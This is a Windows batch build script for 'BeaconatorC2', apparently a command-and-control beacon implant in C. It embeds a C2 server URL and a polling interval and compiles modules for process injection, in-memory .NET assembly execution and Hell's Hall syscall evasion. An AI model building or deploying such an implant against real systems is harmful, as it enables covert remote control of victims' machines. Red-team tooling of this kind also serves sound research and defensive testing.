@echo off
setlocal enabledelayedexpansion

echo ===============================================
echo  BeaconatorC2 - C Beacon Compiler
echo ===============================================
echo.

REM Change to script directory
cd /d "%~dp0"

REM Check for config.json
if not exist "config.json" (
    echo [ERROR] config.json not found
    echo Please create config.json with build configuration
    pause
    exit /b 1
)

REM Parse config.json using PowerShell
echo [*] Reading configuration from config.json...

for /f "usebackq delims=" %%a in (`powershell -NoProfile -Command "(Get-Content 'config.json' | ConvertFrom-Json).beacon.server_url"`) do set SERVER_URL=%%a
for /f "usebackq delims=" %%a in (`powershell -NoProfile -Command "(Get-Content 'config.json' | ConvertFrom-Json).beacon.id"`) do set BEACON_ID=%%a
for /f "usebackq delims=" %%a in (`powershell -NoProfile -Command "(Get-Content 'config.json' | ConvertFrom-Json).beacon.polling_interval_ms"`) do set POLLING_INTERVAL=%%a
for /f "usebackq delims=" %%a in (`powershell -NoProfile -Command "(Get-Content 'config.json' | ConvertFrom-Json).beacon.max_retries"`) do set MAX_RETRIES=%%a
for /f "usebackq delims=" %%a in (`powershell -NoProfile -Command "(Get-Content 'config.json' | ConvertFrom-Json).build.output_name"`) do set OUTPUT_NAME=%%a
for /f "usebackq delims=" %%a in (`powershell -NoProfile -Command "(Get-Content 'config.json' | ConvertFrom-Json).modules.execute_assembly.auto_compile"`) do set EA_AUTO_COMPILE=%%a
for /f "usebackq delims=" %%a in (`powershell -NoProfile -Command "(Get-Content 'config.json' | ConvertFrom-Json).modules.execute_assembly.dll_path"`) do set EA_DLL_PATH=%%a

REM Validate required config
if "%SERVER_URL%"=="" set SERVER_URL=http://127.0.0.1:8080
if "%BEACON_ID%"=="" set BEACON_ID=beacon_001
if "%POLLING_INTERVAL%"=="" set POLLING_INTERVAL=10000
if "%MAX_RETRIES%"=="" set MAX_RETRIES=5
if "%OUTPUT_NAME%"=="" set OUTPUT_NAME=BeaconatorC2_C.exe

echo [+] Configuration loaded:
echo     Server URL: %SERVER_URL%
echo     Beacon ID: %BEACON_ID%
echo     Polling Interval: %POLLING_INTERVAL% ms
echo     Max Retries: %MAX_RETRIES%
echo     Output: %OUTPUT_NAME%
echo.

REM ----------------[ExecuteAssembly DLL Check]-----------------------------------------------
if /i "%EA_AUTO_COMPILE%"=="True" (
    echo [*] Checking ExecuteAssembly DLL...
    if not exist "%EA_DLL_PATH%" (
        echo [!] ExecuteAssembly.dll not found at %EA_DLL_PATH%
        echo [*] Attempting to compile ExecuteAssembly...
        
        set EA_SRC_DIR=src\modules\external\execute_assembly
        if exist "!EA_SRC_DIR!\build.bat" (
            pushd "!EA_SRC_DIR!"
            call build.bat
            popd
            
            if exist "%EA_DLL_PATH%" (
                echo [+] ExecuteAssembly.dll compiled successfully
            ) else (
                echo [!] Warning: ExecuteAssembly.dll compilation may have failed
                echo     execute_assembly module may not work
            )
        ) else (
            echo [!] Warning: No build script found for ExecuteAssembly
            echo     execute_assembly module may not work
        )
    ) else (
        echo [+] ExecuteAssembly.dll found
    )
    echo.
)

REM ----------------[Source Files]-----------------------------------------------
set SRC_CORE=src\core\asynchandler.c src\core\httphandler.c src\core\base.c src\core\encryption.c
set SRC_MODULES=src\modules\whoami.c src\modules\pwd.c src\modules\ls.c src\modules\ps.c src\modules\inject.c src\modules\execute_assembly.c
set SRC_UTILS=src\utils\hellshall.c
set SRC_MAIN=src\main.c
set ASM_SOURCE=src\utils\hall.asm

set ALL_SOURCES=%SRC_MAIN% %SRC_CORE% %SRC_MODULES% %SRC_UTILS%

REM ----------------[Compiler Definitions]-----------------------------------------------
set DEFINES=/DSERVER_URL=\"%SERVER_URL%\" /DBEACON_ID=\"%BEACON_ID%\" /DPOLLING_INTERVAL=%POLLING_INTERVAL% /DMAX_RETRIES=%MAX_RETRIES%
set DEFINES_GCC=-DSERVER_URL=\"%SERVER_URL%\" -DBEACON_ID=\"%BEACON_ID%\" -DPOLLING_INTERVAL=%POLLING_INTERVAL% -DMAX_RETRIES=%MAX_RETRIES%

set LIBS=winhttp.lib user32.lib kernel32.lib advapi32.lib
set LIBS_GCC=-lwinhttp -luser32 -lkernel32 -ladvapi32

set INCLUDE_DIRS=/I"include"
set INCLUDE_DIRS_GCC=-I"include"

REM ----------------[Compiler Detection]-----------------------------------------------
echo [*] Detecting available compiler...

REM Try Visual Studio via vswhere
if exist "%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe" (
    for /f "usebackq tokens=*" %%i in (`"%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe" -latest -products * -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath`) do (
        set VS_PATH=%%i
        if exist "!VS_PATH!\VC\Auxiliary\Build\vcvarsall.bat" (
            echo [+] Found Visual Studio at: !VS_PATH!
            call "!VS_PATH!\VC\Auxiliary\Build\vcvarsall.bat" x64 >nul 2>&1
            goto :compile_msvc
        )
    )
)

REM Fallback: check if cl.exe is in PATH
where cl.exe >nul 2>&1
if !errorlevel! == 0 (
    echo [+] Found cl.exe in PATH
    goto :compile_msvc_nohall
)

REM Try Clang
where clang.exe >nul 2>&1
if !errorlevel! == 0 (
    echo [+] Found Clang compiler
    goto :compile_clang
)

REM Try GCC
where gcc.exe >nul 2>&1
if !errorlevel! == 0 (
    echo [+] Found GCC compiler
    goto :compile_gcc
)

echo [ERROR] No supported compiler found!
echo Please install one of the following:
echo   - Visual Studio with C++ tools (recommended)
echo   - Clang
echo   - GCC (MinGW)
pause
exit /b 1

REM ----------------[MSVC Compilation]-----------------------------------------------
:compile_msvc
echo.
echo [*] Compiling with MSVC (with assembly)...

REM Assemble the ASM file first
echo [*] Assembling %ASM_SOURCE%...
ml64 /c /nologo /Fo"hall.obj" %ASM_SOURCE%
if !errorlevel! neq 0 (
    echo [!] Assembly compilation failed, continuing without Hell's Hall
    goto :compile_msvc_nohall
)

if not exist "hall.obj" (
    echo [!] hall.obj not created, continuing without Hell's Hall
    goto :compile_msvc_nohall
)

echo [*] Compiling C sources...
cl /nologo %ALL_SOURCES% hall.obj %INCLUDE_DIRS% %DEFINES% /Fe:%OUTPUT_NAME% %LIBS%
goto :build_complete

:compile_msvc_nohall
echo [*] Compiling with MSVC (without assembly)...
cl /nologo %ALL_SOURCES% %INCLUDE_DIRS% %DEFINES% /Fe:%OUTPUT_NAME% %LIBS%
goto :build_complete

REM ----------------[Clang Compilation]-----------------------------------------------
:compile_clang
echo.
echo [*] Compiling with Clang...
clang %ALL_SOURCES% %INCLUDE_DIRS_GCC% %DEFINES_GCC% -o %OUTPUT_NAME% %LIBS_GCC%
goto :build_complete

REM ----------------[GCC Compilation]-----------------------------------------------
:compile_gcc
echo.
echo [*] Compiling with GCC...
gcc %ALL_SOURCES% %INCLUDE_DIRS_GCC% %DEFINES_GCC% -o %OUTPUT_NAME% %LIBS_GCC%
goto :build_complete

REM ----------------[Build Complete]-----------------------------------------------
:build_complete
echo.
if !errorlevel! == 0 (
    echo ===============================================
    echo  Build Successful
    echo ===============================================
    echo  Output: %OUTPUT_NAME%
    echo.
    echo  Configuration:
    echo    Server: %SERVER_URL%
    echo    Beacon ID: %BEACON_ID%
    echo    Poll Interval: %POLLING_INTERVAL% ms
    echo    Max Retries: %MAX_RETRIES%
    echo.
    echo ===============================================
    
    REM Cleanup object files
    if exist "hall.obj" del /q hall.obj
    if exist "*.obj" del /q *.obj
) else (
    echo ===============================================
    echo  Build Failed
    echo ===============================================
    echo  Check error messages above
)

pause